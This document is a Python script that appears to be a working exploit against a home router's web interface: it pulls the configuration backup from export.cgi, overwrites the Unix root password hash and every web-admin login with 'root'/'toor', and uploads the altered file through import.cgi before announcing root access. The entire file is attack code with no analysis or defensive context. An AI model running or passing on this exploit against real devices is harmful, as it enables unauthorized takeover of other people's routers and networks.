import urllib.request
import sys
import crypt
import random
def getSettings(ipaddress='192.168.1.1'):
  req = urllib.request.Request('http://'+ipaddress+'/cgi-bin/export.cgi?Save=%3E+Back+up+your+parameterss&sExportMode=text&iExpert=3&sSuccessPage=backup.htm&sErrorPage=backup.htm')
  req.add_header('Referer', 'http://'+ipaddress+'/en_US/basic/backup.htm')
  r = urllib.request.urlopen(req)
  return(r.read())

def setSettings(settings, ipaddress='192.168.1.1'):
  url = 'http://'+ipaddress+'/cgi-bin/import.cgi'
  boundry="---------------------------"+str(random.randrange(10**28, 10**29-1))
  multiPartForm=bytes()
  multiPartTable = [['Content-Disposition: form-data; name="sImportFile"; filename="router.txt"', 'Content-Type: text/plain\r\n', settings],
                    ['Content-Disposition: form-data; name="Restore"\r\n', '> Restore'],
                    ['Content-Disposition: form-data; name="iExpert"\r\n', '3'],
                    ['Content-Disposition: form-data; name="sSuccessPage"\r\n', 'restart_router.htm'],
                    ['Content-Disposition: form-data; name="sErrorPage"\r\n', 'backup.htm'],
                    ['Content-Disposition: form-data; name="iDelay"\r\n', '5']]

  for part in multiPartTable:
    multiPartForm+=b'--'+boundry.encode("ascii")+b'\r\n'
    for segment in part:
      if type(segment) != type(bytes()):
        segment = segment.encode("ascii")
      multiPartForm+=segment+b'\r\n'
  multiPartForm +=b'--'+boundry.encode("ascii")+b'--\r\n'
  req = urllib.request.Request(url, multiPartForm)
  user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
  req.add_header('Referer', 'http://'+ipaddress+'/en_US/basic/backup.htm')
  req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
  req.add_header('Content-Type', 'multipart/form-data; boundary='+boundry)
  req.add_header('Accept-Encoding', 'gzip, deflate')
  req.add_header('Accept-Language', 'en-gb,en;q=0.5')
  req.add_header('Connection', 'keep-alive')

  response = urllib.request.urlopen(req)
  the_page = response.read()
  if the_page.decode("ascii").find("restart_router.htm")!=-1:
    print("You should now have root access")

originalSettings=''
print("Attempting to get the config file")
if (len(sys.argv)>1):
  originalSettings=getSettings(sys.argv[1])
else:
  originalSettings=getSettings()
f = open('router.txt', 'wb')
f.write(originalSettings)
f.close()
asciiDecodedSettings=originalSettings.decode("ascii")
print("Modifying the config file")
rootTable = [["UserTable_1_Unix_Password='", crypt.crypt('toor', '$1$SALTsalt$')],
    #Set all web config usernames to "root" and passwords to "toor"
             ["WebConfigurator_UserLogin='", "root"],
             ["WebConfigurator_UserPassword='","IVmUCIlkoduGQ"],
             ["WebConfigurator_ExpertLogin='", "root"],
             ["WebConfigurator_ExpertPassword='", "IVmUCIlkoduGQ"],
             ["WebConfigurator_SuLogin='", "root"],
             ["WebConfigurator_SuPassword='", "IVmUCIlkoduGQ"]]

for i in rootTable:
  start  = asciiDecodedSettings.find(i[0])+len(i[0])
  end    = asciiDecodedSettings.find("'", start)
  asciiDecodedSettings = asciiDecodedSettings[:start]+i[1]+asciiDecodedSettings[end:]

rooted=asciiDecodedSettings.encode("ascii")

print("Attempting to upload the modified config file")
if (len(sys.argv)>1):
  setSettings(rooted, sys.argv[1])
else:
  setSettings(rooted)

f = open('rooted.txt', 'wb')
f.write(rooted)
f.close()
